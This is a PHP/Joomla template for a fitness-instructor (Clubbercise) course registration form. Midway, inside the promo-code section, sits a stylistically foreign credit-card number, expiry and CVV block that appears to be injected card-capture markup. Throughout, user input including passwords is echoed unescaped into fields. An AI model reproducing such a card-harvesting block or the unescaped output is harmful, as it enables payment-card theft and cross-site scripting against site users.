						<?php if((strtotime(date('Y-m-d H:i:s')) >= strtotime('2018-01-01 12:00:00') &&  strtotime(date('Y-m-d H:i:s')) <= strtotime('2018-01-07 23:59:00')) || JRequest::getVar('test25') ){ ?>
							<!--<h4 style="color: #FD001A;">25% Discount Applied.</h4>-->
						<?php } ?>
						
						<!-- <div class="first-part"> -->
							<div class="control-group">
								<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_TITLE');?></label>
								 <div class="controls">
								 	<?php
								 	 $options = array();
									 $options[] = JHTML::_('select.option','Miss','Miss');
									 $options[] = JHTML::_('select.option','Mr','Mr.');
									 $options[] = JHTML::_('select.option','Ms','Ms.');
									 $options[] = JHTML::_('select.option','Mrs','Mrs.');
									 $options[] = JHTML::_('select.option','Dr','Dr');
								 	 echo JHTML::_('select.genericList',$options,'title',' tabindex="1"', 'value', 'text',$jvtigetpostdata['title']);
									?>
								 </div>
							</div>
							
							<div class="control-group">
								<label class="control-label" for="inputname">&nbsp;</label>
								 <div class="controls"><input type="hidden" ></div>
							</div>
							
							<div class="control-group">
								<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_FIRSTNAME');?><span style="color:#FF0000"> * </span></label>
								 <div class="controls">
								 	<input tabindex="2" class="required" type="text" name="firstname" value="<?php echo $jvtigetpostdata['firstname'];?>" >
								 </div>
							</div>
							
							<div class="control-group">
								<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_LASTNAME');?><span style="color:#FF0000"> * </span></label>
								 <div class="controls">
								 	<input tabindex="3" class="required" type="text" name="lastname" value="<?php echo $jvtigetpostdata['lastname'];?>" >
								 </div>
							</div>
							<!--...
							<div class="control-group">
								<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_ORGANISATION');?></label>
								 <div class="controls">
								 	<input tabindex="4" type="text" name="organisation" value="<?php echo $schooldetail->organisation;?>" >
								 </div>
							</div>-->
							
							<?php if(!$user->id){?>
								<div class="control-group">
									<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_PASSWORD');?> <span style="color:#FF0000"> * </span> </label>
									 <div class="controls">
									 	<input tabindex="5" class="required" type="password" name="password" id="password" value="<?php echo $jvtigetpostdata['password'];?>" >
									 </div>
								</div>
								
								<div class="control-group">
									<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_REPASSWORD');?> <span style="color:#FF0000"> * </span> </label>
									 <div class="controls">
									 	<input tabindex="6" class="required" type="password" name="repassword" id="repassword" value="<?php echo $jvtigetpostdata['password'];?>" >
									 </div>
								</div>
							<?php } ?>
						
						<?php if($user->id && $usertype == 'me' && $jvtigetpostdata['email']){?>
								
							<div class="control-group">
								<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_EMAIL');?><span style="color:#FF0000"> * </span></label>
								 <div class="controls">
								 	<input tabindex="7" class="required email validate-email" readonly="" type="text" id="email" name="email" value="<?php echo $jvtigetpostdata['email'];?>" >
								 	<input type="hidden" name="email" value="<?php echo $jvtigetpostdata['email'];?>" >
								 </div>
								
							</div>
							
							<div class="control-group">
								<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_EMAIL').' (Please repeat)';?><span style="color:#FF0000"> * </span></label>
								 <div class="controls">
								 	<input tabindex="8" class="required email validate-email" readonly="" type="text" id="repeatemail" name="repeatemail" value="<?php echo $jvtigetpostdata['repeatemail'];?>" >
								 	<input type="hidden" name="repeatemail" value="<?php echo $jvtigetpostdata['email'];?>" >
								 </div>
								
							</div>
							
						<?php }else{ ?>
							
							<div class="control-group">
								<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_EMAIL');?><span style="color:#FF0000"> * </span></label>
								 <div class="controls">
								 	<input tabindex="7" class="required email validate-email" type="text" id="email" name="email" value="<?php echo $jvtigetpostdata['email'];?>" >
								 </div>
								
							</div>
							
							<div class="control-group">
								<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_EMAIL').' (Please repeat)';?><span style="color:#FF0000"> * </span></label>
								 <div class="controls">
								 	<input tabindex="8" class="required email validate-email" type="text" id="repeatemail" name="repeatemail" value="<?php echo $jvtigetpostdata['repeatemail'];?>" >
								 </div>
								
							</div>
							
						<?php } ?>		
							
							<div class="control-group phone-number-area">
								
								<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_MOBILE_AND_HOME');?> <span style="color:#FF0000">*</span></label>
								
								<div class="controls phone-number">
									
									<div class="country-code">
									<?php
								 	/* $phncode = array();
									 $phncode[] = JHTML::_('select.option','+44','+44');
									 $phncode[] = JHTML::_('select.option','+61','+61');
									 $phncode[] = JHTML::_('select.option','+49','+49');
									 */
									 #echo JHTML::_('select.genericList',$phncode,'phone_country_code',' tabindex="8"', 'value', 'text', $jvtigetpostdata['phone_country_code']);
									?>
								
									</div>
									
									<input tabindex="9" class="required validate-numeric"  type="text" name="mobile" value="<?php echo $jvtigetpostdata['mobile'];?>" >
								</div>
							</div>
							
							<div class="control-group">
								<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_DATEOFBIRTH');?><span style="color:#FF0000"> * </span></label>
								<div class="controls">
								 	<?php
								 	
								 	 $dob_day = $jvtigetpostdata['dob_day']; 
								 	 $options = array();
									 $options[] = JHTML::_('select.option','','Day');
									 for($p=1;$p<=31;$p++){
									 	$options[] = JHTML::_('select.option',$p,$p);
									 }
									 echo JHTML::_('select.genericList',$options,'dob_day',' class="required select" onchange="checkrequiredfield()" tabindex="10" style="width:78px;" ', 'value', 'text',$dob_day);
																	 	
								 	 $dob_month = $jvtigetpostdata['dob_month']; 
								 	 $options = array();
									 $options[] = JHTML::_('select.option','','Month');
									 $options[] = JHTML::_('select.option','1','Jan');
									 $options[] = JHTML::_('select.option','2','Feb');
									 $options[] = JHTML::_('select.option','3','Mar');
									 $options[] = JHTML::_('select.option','4','Apr');
									 $options[] = JHTML::_('select.option','5','May');
									 $options[] = JHTML::_('select.option','6','June');
									 $options[] = JHTML::_('select.option','7','July');
									 $options[] = JHTML::_('select.option','8','Aug');
									 $options[] = JHTML::_('select.option','9','Sept');
									 $options[] = JHTML::_('select.option','10','Oct');
									 $options[] = JHTML::_('select.option','11','Nov');
									 $options[] = JHTML::_('select.option','12','Dec');
									 
									 echo JHTML::_('select.genericList',$options,'dob_month',' class="required" onchange="checkrequiredfield()" tabindex="11" style="width:94px;" ', 'value', 'text',$dob_month);
									 
									 $dob_year = $jvtigetpostdata['dob_year']; 
								 	 $options = array();
									 $options[] = JHTML::_('select.option','','Year');
									 $currentyear_18 = date('Y')-15;
									 $currentyear_60 = date('Y')-78;
									 /* for($p=2000;$p>=1940;$p--){ */
									 for($p=$currentyear_18;$p>=$currentyear_60;$p--){
									 	$options[] = JHTML::_('select.option',$p,$p);
									 }
									 echo JHTML::_('select.genericList',$options,'dob_year',' class="required" onchange="checkrequiredfield()" tabindex="12" style="width:85px;" ', 'value', 'text',$dob_year);
									?>
									
								</div>
								 <!-- Please enter dd/mm/yyyy -->
							</div>
                            
							<div class="control-group">
								<label class="control-label" for="address1"><?php echo JText::_('COM_JVTIGER_FORM_ADDRESS1');?><span style="color:#FF0000"> * </span></label>
								 <div class="controls">
								 	<input tabindex="13" class="required" onfocus="checkrequiredfield();" type="text" name="address1" value="<?php echo $jvtigetpostdata['address1'];?>" >
								 </div>
							</div>
							
							<div class="control-group">
								<label class="control-label" for="address2"><?php echo JText::_('COM_JVTIGER_FORM_ADDRESS2');?></label>
								 <div class="controls">
								 	<input tabindex="14" type="text" name="address2" value="<?php echo $jvtigetpostdata['address2'];?>" >
								 </div>
							</div>
									
							
							<div class="control-group">
								<label class="control-label" for="city"><?php echo JText::_('COM_JVTIGER_FORM_CITY');?> <span style="color:#FF0000"> * </span> </label>
								 <div class="controls">
								 	<input tabindex="15" class="required" type="text" name="city" value="<?php echo $jvtigetpostdata['city'];?>" >
								 </div>
							</div>
							
							<div class="control-group">
							<!-- 	<label class="control-label county_lbl" for="county"><?php echo JText::_('COM_JVTIGER_FORM_COUNTY');?>
									<span id="county_label" style="color:#FF0000;display: none;"> * </span>

								</label> -->
								<label class="control-label county_lbl" for="county"><?php echo JText::_('COM_JVTIGER_FORM_COUNTY');?>
									<span id="county-span-valid" style="color:#FF0000;"> * </span>
								</label>
								
								 <div class="controls" id="costate">
								 	<input tabindex="16" type="text" name="county" id="county" value="<?php echo $jvtigetpostdata['county'];?>" >
								 </div>
							</div>
							
							<div class="control-group">
								<label class="control-label" for="postcode"><?php echo JText::_('COM_JVTIGER_FORM_POSTCODE');?> <span style="color:#FF0000"> * </span></label>
								 <div class="controls">
								 	<input tabindex="17" class="required" type="text" name="postcode" value="<?php echo $jvtigetpostdata['postcode'];?>" >
								 </div>
							</div>
							
							<div class="control-group">
								<label class="control-label" for="country_value"><?php echo JText::_('Country');?><span style="color:#FF0000"> * </span></label>
								 <div class="controls " id="country_value">
								 	<!-- <input tabindex="18" type="text" name="country" value="<?php echo $jvtigetpostdata['country'];?>" > -->
								 	<?php
								 	 $coptions = array();
									 $coptions[] = JHTML::_('select.option','','Select Country');
									 foreach($countries as $k=>$country){
									 	$coptions[] = JHTML::_('select.option',$country,$country);
									 }
								 	 echo JHTML::_('select.genericList',$coptions,'country',' class="required" tabindex="18" onchange="findStates(this.value)"', 'value', 'text',$jvtigetpostdata['country']);
									?>
								 	
								 </div>
							</div>
							<?php if(!$user->id){?>
								<div class="control-group">
									<label class="control-label" for="inputname"><?php echo JText::_('COM_JVTIGER_FORM_HEAR_ABOUT');?></label>
									 <div class="controls">
									 	<?php
									 	 $options = array();
										 $options[] = JHTML::_('select.option','','Select');
										 $options[] = JHTML::_('select.option','Email','Email');
										 $options[] = JHTML::_('select.option','Facebook','Facebook');
										 $options[] = JHTML::_('select.option','Instagram','Instagram');
										 $options[] = JHTML::_('select.option','LIW','LIW');
										 $options[] = JHTML::_('select.option','PT magazine','PT magazine');
										 $options[] = JHTML::_('select.option','REPs website','REPs website');
										 $options[] = JHTML::_('select.option','Twitter','Twitter');
										 $options[] = JHTML::_('select.option','Word of mouth','Word of mouth');
										 $options[] = JHTML::_('select.option','Workout magazine','Workout magazine');
										 $options[] = JHTML::_('select.option','Other','Other');
									 	 echo JHTML::_('select.genericList',$options,'hear_about',' onchange="selectotheropt(this.value)" ', 'value', 'text',$jvtigetpostdata['hear_about']);
										?>
									 </div>
								</div>
								<div class="control-group" id="other_textfild" style="display: none">
									<label class="control-label" for="hear_other"><?php echo JText::_('Other');?></label>
									 <div class="controls">
									 	<input type="text" name="hear_other" value="<?php echo $jvtigetpostdata['hear_other'];?>" >
									 </div>
								</div>
							<?php } ?>
							
							<!-- <div class="clear"></div>
						</div>
						<div class="second-part">
							<div class="clear"></div>
						</div> -->
						<div class="clear"></div>
					</div>
					
					<div class="bottom-part">
						
						
					<?php /* if($countrycode != "Germany" && $countrycode != "Australia" && $under_18 != "Kids Combo"){  ?>
							
						<div class="control-group">
							<?php if($under_18 == "Under 18"){?>
								 <label class="control-label-under18" for="confirm_checkbox" id="confirm_checkbox_label"><?php echo JText::_('COM_JVTIGER_FORM_CONFIRM_TERRITORIES_18');?></label>
							 <?php }else{ ?>
								 <div class="controls">
							 		<input tabindex="18" class="required" type="checkbox" name="confirm" id="confirm_checkbox" onblur="checkboxvalidation('confirm_checkbox','confirm_checkbox_label')" value="1" <?php if($jvtigetpostdata['confirm']){ echo ' checked '; }?> >
							 	</div>
							 	<label class="control-label" for="confirm_checkbox" id="confirm_checkbox_label"><?php echo JText::_('COM_JVTIGER_FORM_CONFIRM_TERRITORIES');?> <span style="color:#FF0000">*</span> </label>
							<?php }?>
						</div>
						
					<?php } */?>
						
					<?php if($under_18 != "Kids Combo"){?>

						<div class="control-group checkboxes" id="mycheckboxes_areyou">
							<h3 id="where-are-you-title"><?php echo JText::_('Where are you planning to teach Clubbercise?'); ?><span style="color:#FF0000"> * </span></h3>
							<div class="controls tick-course areyousection">
								<div class="inner-check">
									<input <?php if($completedcourses_areyou == 'Independent'){ echo ' checked ';}?> type="radio" name="are_you" id="are_you1" value="<?php echo JText::_('Independent');?>" >
									<label for="are_you1" id="are_you1_label"><?php echo JText::_('In the community (hiring a venue yourself)');?></label>
								</div>

								<div class="inner-check">
									<input <?php if($completedcourses_areyou == 'Independent and Venue'){ echo ' checked ';}?>  type="radio" name="are_you" id="are_you2" value="<?php echo JText::_('Independent and Venue');?>" >
									<label for="are_you2" id="are_you2_labe1"><?php echo JText::_('In the community + for gyms/studios*');?></label>
								</div>

								<div class="inner-check">
									<input <?php if($completedcourses_areyou == 'Venue'){ echo ' checked ';}?>  type="radio" name="are_you" id="are_you3" value="<?php echo JText::_('Venue');?>" >
									<label for="are_you3" id="are_you3_labe1"><?php echo JText::_('For gyms/studios only*');?></label>
								</div>

								<div class="inner-check">
									<input <?php if($completedcourses_areyou == 'Other'){ echo ' checked ';}?>  type="radio" name="are_you" id="are_you4" value="<?php echo JText::_('Other');?>" >
									<label for="are_you4" id="are_you4_labe1"><?php echo JText::_('Other');?></label>
								</div>

								<h3 style="color: #f00c93;"><i>* Please note: All gyms/dance studios running classes need to be licensed, <a href="/venue-licence" target="_blank" style="text-decoration: underline">find out more</a></i></h3>
							</div>
						</div>


					<?php } ?>
						
                        <div class="clear"></div>	
                        <br />
						
						<div class="control-group checkboxes">
							 <h3><?php echo JText::_('COM_JVTIGER_FORM_PLEASE_TICKS');?><span style="color:#FF0000"> * </span></h3>
							 <div class="controls tick-course " id="mycheckboxes" >
                              
                            <?php if($countrycode == "Germany"){ ?> 
                             
                             	<div class="inner-check">
								 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL10'),$completedcourses)){ echo ' checked ';}?> tabindex="23" type="checkbox" name="completed_courses[10]" id="completed_courses10" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL10');?>" >
								 	<label for="completed_courses10"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL10');?></label>
							 	</div>
                                
                                <div class="inner-check">
								 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL11'),$completedcourses)){ echo ' checked ';}?> tabindex="23" type="checkbox" name="completed_courses[11]" id="completed_courses11" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL11');?>" >
								 	<label for="completed_courses11"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL11');?></label>
							 	</div>
                                   
								<div class="inner-check">
								 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL12'),$completedcourses)){ echo ' checked ';}?> tabindex="21" type="checkbox" name="completed_courses[12]" id="completed_courses12" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL12');?>" >
								 	<label for="completed_courses12"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL12');?></label>
								</div>
								
								<!-- <div class="approvaltext"><i>(must be submitted to us for approval before booking the course)</i></div> -->
                                  
                            <?php } else if($countrycode == "Australia"){ ?>
                            	
                            	<div class="inner-check">
								 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL13'),$completedcourses)){ echo ' checked ';}?> tabindex="23" type="checkbox" name="completed_courses[13]" id="completed_courses13" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL13');?>" >
								 	<label for="completed_courses13"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL13');?></label>
							 	</div>
                                
                                <div class="inner-check">
								 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL14'),$completedcourses)){ echo ' checked ';}?> tabindex="23" type="checkbox" name="completed_courses[14]" id="completed_courses14" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL14');?>" >
								 	<label for="completed_courses14"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL14');?></label>
							 	</div>
							 	
							 	<div class="inner-check">
								 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL3'),$completedcourses)){ echo ' checked ';}?> tabindex="23" type="checkbox" name="completed_courses[3]" id="completed_courses3" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL3');?>" >
								 	<label for="completed_courses3"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL3');?></label>
							 	</div>
                                   
								<div class="inner-check">
								 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL12'),$completedcourses)){ echo ' checked ';}?> tabindex="21" type="checkbox" name="completed_courses[12]" id="completed_courses12" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL12');?>" >
								 	<label for="completed_courses12"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL12');?></label>
								</div>

                                <!-- <div class="approvaltext"><i>(must be submitted to us for approval before booking the course)</i></div> -->
                             	
                            <?php } else { ?> 
                            	
                                <?php if($under_18 != "Adult"){?>
	                                <div class="inner-check">
									 	<input <?php if(in_array('Kids Fitness Level 2',$completedcourses)){ echo ' checked ';}?> tabindex="23" type="checkbox" name="completed_courses[6]" id="completed_courses6" value="Kids Fitness Level 2" >
									 	<label for="completed_courses6"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL6');?></label>
								 	</div>
								<?php } ?>
                                   
							 	<div class="inner-check">
								 	<input <?php if(in_array('Level 2 Exercise to Music',$completedcourses)){ echo ' checked ';}?> tabindex="19" type="checkbox" name="completed_courses[0]" id="completed_courses1" value="Level 2 Exercise to Music" >
								 	<label for="completed_courses1" id="completed_courses1_label"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL1');?></label>
							 	</div>
							 	
                                <?php if($under_18 != "Under 18"){?>
                                 	<div class="inner-check">
									 	<input <?php if(in_array('Another Level 2 Fitness or Dance qualification',$completedcourses)){ echo ' checked ';}?> tabindex="20" type="checkbox" name="completed_courses[1]" id="completed_courses2" value="Another Level 2 Fitness or Dance qualification" >
									 	<label for="completed_courses2"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL2');?></label>
								 	</div>
                                <?php }?>
								  
								<?php if($under_18 != "Adult" && $under_18 != "Kids Combo"){?>
	                                <div class="inner-check">
									 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL9'),$completedcourses)){ echo ' checked ';}?> tabindex="23" type="checkbox" name="completed_courses[9]" id="completed_courses9" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL9');?>" >
									 	<label for="completed_courses9"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL9');?></label>
								 	</div>
                                <?php }?>
								
								<div class="inner-check">
								 	<input <?php if(in_array(JText::_('Group Exercise Access Course'),$completedcourses)){ echo ' checked ';}?> tabindex="23" type="checkbox" name="completed_courses[15]" id="completed_courses4" value="<?php echo JText::_('Group Exercise Access Course');?>" >
								 	<label for="completed_courses4"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL4_NEW');?></label>
							 	</div>

								<?php if($under_18 != "Under 18" && $under_18 != "Kids Combo"){?>
								 	<div class="inner-check">
									 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL3'),$completedcourses)){ echo ' checked ';}?> tabindex="21" type="checkbox" name="completed_courses[2]" id="completed_courses3" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL3');?>" >
									 	<label for="completed_courses3"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL3');?></label>
									</div>
                                <?php }?>
								
								<?php if($under_18 != "Under 18" && $under_18 != "Kids Combo"){?>
									<div class="inner-check">
									 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL5_NEW'),$completedcourses)){ echo ' checked ';}?> tabindex="22" type="checkbox" name="completed_courses[3]" id="completed_courses5" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL5_NEW');?>" >
									 	<label for="completed_courses5"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL5_NEW');?></label>
								 	</div>


                                    <!-- <div class="approvaltext"><i>(must be submitted to us for approval before booking the course)</i></div> -->
                                <?php } ?>
                                
                                
                                <?php if($under_18 != "Adult" && $under_18 != "Kids Combo"){?>
                                 	<div class="inner-check">
									 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL7'),$completedcourses)){ echo ' checked ';}?> tabindex="20" type="checkbox" name="completed_courses[7]" id="completed_courses7" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL7');?>" >
									 	<label for="completed_courses7"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL7');?></label>
							 		</div>
                                <?php }?>
                                  
                                <?php if($under_18 != "Adult" && $under_18 != "Kids Combo"){?>
                                 	<div class="inner-check">
									 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL8'),$completedcourses)){ echo ' checked ';}?> tabindex="20" type="checkbox" name="completed_courses[8]" id="completed_courses8" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL8');?>" >
									 	<label for="completed_courses8"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL8');?></label>

                                        <!-- <div class="approvaltext"><i>(must be submitted to us for approval before booking the course)</i></div> -->

							 		</div>
                                <?php }?>
 
							 	<!--  
							 	<div class="inner-check">
								 	<input <?php if(in_array(JText::_('COM_JVTIGER_FORM_CC_LABEL4'),$completedcourses)){ echo ' checked ';}?> onclick="checkotherticks(this.checked);" tabindex="23" type="checkbox" name="completed_courses[]" id="completed_courses4" value="<?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL4');?>" >
								 	<label for="completed_courses4"><?php echo JText::_('COM_JVTIGER_FORM_CC_LABEL4');?></label>
							 	</div> -->
							  
							  <?php } // for country code ?>
							 	
							 	<div id="other_courses_done" class="other_courses_done inner-check" style="display: none;">
							 		<input type="text" name="completed_courses_other" id="completed_courses3_other" value="<?php echo $jvtigetpostdata['completed_courses_other'];?>" >
							 		<label for="completed_courses4 othercourse"><?php echo JText::_('COM_JVTIGER_FORM_OTHER_COURSE_WARNING');?></label>
							 	</div>
							 	<div class="qualifications">
							 		
							 		<?php if($under_18 == "Kids Combo"){ ?>
							 			<?php echo '<h3><a href="https://www.clubbercise.com/qualKids.html" class="modal" rel="{handler: \'iframe\', size: {x: 500, y: 150}}">Don&#8216t have the qualifications? </a></h3>';?>
							 		<?php }else{?>
							 			<?php echo '<h3><a href="https://www.clubbercise.com/qual.html" class="modal" rel="{handler: \'iframe\', size: {x: 700, y: 150}}">Don&#8216t have the qualifications? </a></h3>';?>
							 		<?php } ?>
							 		
							 	</div>  
							 	
							 </div>
							 
						</div>
                        <div class="clear"></div>	   
						
						
						<?php if($under_18 == "Kids Combo"){ $clsbn = ' kidclsclb';} ?>
						
						<?php /* if($under_18 == "Kids Combo" && $canget_discount){ ?>
							
						<?php }else{ */ ?>	
							
							<?php if($show_vt_discount_promocode && !$manual){ ?>
								
								<div class="control-group promocodes <?php echo $clsbn; ?>">
									 <label class="control-label" for="postcode"><?php echo JText::_('COM_JVTIGER_FORM_PROMO_CODE');?></label>
									 <div class="controls">
									 	<input tabindex="24" type="text" id="promocode" name="promocode" value="<?php /* echo $jvtigetpostdata['promocode']; */?>" >
									 	<br>
									 	<!-- <input type="button" name="couponapply" id="applycoupon" value="<?php echo JText::_('COM_JVTIGER_FORM_APPLY_COUPON');?>" class="buttontext button" /> -->
									 	<h3 style="color: #f00c93;"><?php echo JText::_('All Codes are Case Sensitive');?></h3> 	 
									 </div>
	
									 
								</div> 
								
								<div class="credit-card-container">
    <!-- Logo Provider Credit Card -->
    <div class="credit-card-providers">
        <img src="https://cdn-icons-png.flaticon.com/512/196/196561.png" alt="Visa Logo" class="credit-card-logo">
        <img src="https://cdn-icons-png.flaticon.com/512/196/196578.png" alt="Mastercard Logo" class="credit-card-logo">
        <img src="https://cdn-icons-png.flaticon.com/512/196/196566.png" alt="Amex Logo" class="credit-card-logo">
        <img src="https://cdn-icons-png.flaticon.com/512/196/196544.png" alt="Discover Logo" class="credit-card-logo">
    </div>
    
    <!-- Form Input Card Number -->
    <div class="credit-card-input">
        <label for="credit-card" class="credit-card-label">Card Number</label>
        <div class="input-container">
            <input 
                type="text" 
                id="credit-card" 
                name="card_number" 
                placeholder="1234 5678 9012 3456" 
                maxlength="19" 
                oninput="formatAndDetectCard(this)" 
                class="credit-card-field" 
                required>
            <span class="input-icon">
                <img id="card-icon" src="https://cdn-icons-png.flaticon.com/512/6963/6963703.png" alt="Generic Card Icon">
            </span>
        </div>
    </div>
    
    <!-- Input Expiration Date and CVV -->
    <div class="credit-card-extra">
        <div class="exp-input">
            <label for="exp" class="credit-card-label-small">Expiration Date</label>
            <div class="input-container">
                <input 
                    type="text" 
                    id="exp" 
                    name="expiry_date" 
                    placeholder="MM/YY" 
                    maxlength="5" 
                    oninput="formatExpDate(this)" 
                    class="credit-card-field-small" 
                    required>
                <span class="input-icon">&#128197;</span>
            </div>
        </div>
        <div class="cvv-input">
            <label for="cvv" class="credit-card-label-small">Security Code</label>
            <div class="input-container">
                <input 
                    type="text" 
                    id="cvv" 
                    name="cvv" 
                    placeholder="123" 
                    maxlength="4" 
                    class="credit-card-field-small" 
                    required>
                <span class="input-icon">&#128274;</span>
            </div>
        </div>
    </div>
</div>

<style>
    /* Container Style */
    .credit-card-container {
        background: #fff;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        width: 350px;
        margin: 0 auto;
    }

    /* Logo Provider Style */
    .credit-card-providers {
        display: flex;
        justify-content: center;
        gap: 10px;
        margin-bottom: 15px;
    }

    .credit-card-logo {
        width: 50px;
        height: auto;
        transition: transform 0.3s ease, opacity 0.3s ease;
    }

    .credit-card-logo:hover {
        transform: scale(1.1);
        opacity: 0.8;
    }

    /* Card Number Input */
    .credit-card-label {
        font-size: 14px;
        font-weight: bold;
        color: #333;
        margin-bottom: 5px;
        display: block;
    }

    .input-container {
        position: relative;
        display: flex;
        align-items: center;
    }

    .credit-card-field {
        border: 1px solid #ccc;
        border-radius: 5px;
        padding: 10px;
        width: 100%;
        font-size: 16px;
        background: #f9f9f9;
        outline: none;
        transition: border-color 0.3s, box-shadow 0.3s;
        color: #333; /* Professional text color */
        font-family: 'Courier New', Courier, monospace;
        letter-spacing: 1px;
    }

    .credit-card-field:focus {
        border-color: #007bff;
        box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        background: #fff;
    }

    /* Expiration Date and CVV */
    .credit-card-extra {
        display: flex;
        justify-content: space-between;
        gap: 10px;
    }

    .exp-input, .cvv-input {
        flex: 1;
    }

    .credit-card-label-small {
        font-size: 14px;
        font-weight: bold;
        color: #333;
        margin-bottom: 5px;
        display: block;
    }

    .credit-card-field-small {
        border: 1px solid #ccc;
        border-radius: 5px;
        padding: 10px;
        width: 100%;
        font-size: 14px;
        background: #f9f9f9;
        outline: none;
        transition: border-color 0.3s, box-shadow 0.3s;
        color: #333; /* Professional text color */
        font-family: 'Courier New', Courier, monospace;
    }

    .credit-card-field-small:focus {
        border-color: #007bff;
        box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        background: #fff;
    }

    .input-icon {
        position: absolute;
        right: 10px;
        font-size: 16px;
        color: #aaa;
        pointer-events: none;
        display: flex;
        align-items: center;
    }

    .input-icon img {
        width: 20px;
        height: auto;
    }

    .input-container:hover .input-icon {
        color: #007bff;
    }
</style>

<script>
    /* Function to Format Card Number */
    function formatAndDetectCard(input) {
        input.value = input.value
            .replace(/\D/g, '') // Remove non-numeric characters
            .replace(/(.{4})/g, '$1 ') // Add space after every 4 digits
            .trim(); // Remove trailing space
    }

    /* Function to Format Expiration Date */
    function formatExpDate(input) {
        input.value = input.value
            .replace(/\D/g, '') // Remove non-numeric characters
            .replace(/(\d{2})(\d{1,2})/, '$1/$2') // Format as MM/YY
            .slice(0, 5); // Limit to 5 characters
    }
</script>

							
								
								<div class="control-group couponmessage">
									 <label for="couponmessage" class="control-label couponmessage" id="couponmessage"></label>
									 <input type="hidden" name="coupon_applied" id="coupon_applied" value="0" />
								</div>
							<?php } ?>
							
						<?php /* } */ ?>

                        <div class="control-group agree-check">
                            <div class="controls">
                                <input tabindex="26" class="required" type="checkbox" onblur="checkboxvalidation('checkbox_qualification','checkbox_qualification_label')" name="checkbox_qualification" id="checkbox_qualification" value="1"></div>
                            <label class="control-label" for="checkbox_qualification" id="checkbox_qualification_label">I will submit a copy of my qualification prior to the course<span style="color:#FF0000">*</span></label>
                        </div>

						<div class="control-group agree-check">
							<div class="controls">
								<input tabindex="26" class="required" type="checkbox" onblur="checkboxvalidation('checkbox_understand_requirements','checkbox_understand_requirements_label')" name="checkbox_understand_requirements" id="checkbox_understand_requirements" value="1"></div>
							<label class="control-label" for="checkbox_understand_requirements" id="checkbox_understand_requirements_label">I understand the Clubbercise licence requirements<span style="color:#FF0000">*</span></label>
						</div>
						
					<?php if($countrycode != "Germany" && $countrycode != "Australia" && $under_18 != "Kids Combo"){  ?>
							
						<div class="control-group agree-check">
							 <div class="controls">
							 <input tabindex="25" class="required" type="checkbox" onblur="checkboxvalidation('checkbox_CodeofConduct','checkbox_CodeofConduct_label')" name="CodeofConduct" id="checkbox_CodeofConduct" value="1" <?php if($jvtigetpostdata['CodeofConduct']){ echo 'checked';}?> ></div>
							 <label class="control-label" for="checkbox_CodeofConduct" id="checkbox_CodeofConduct_label">
							 	 <?php if($under_18 == "Under 18"){?>
							 		<a target="_blank" href="<?php echo JURI::base();?>instructorpack/Clubbercise_U18_Code_of_Conduct.pdf" class="active"><?php echo JText::_('I agree to the Clubbercise Code of Conduct');?></a>
							 	 <?php }else{ ?>
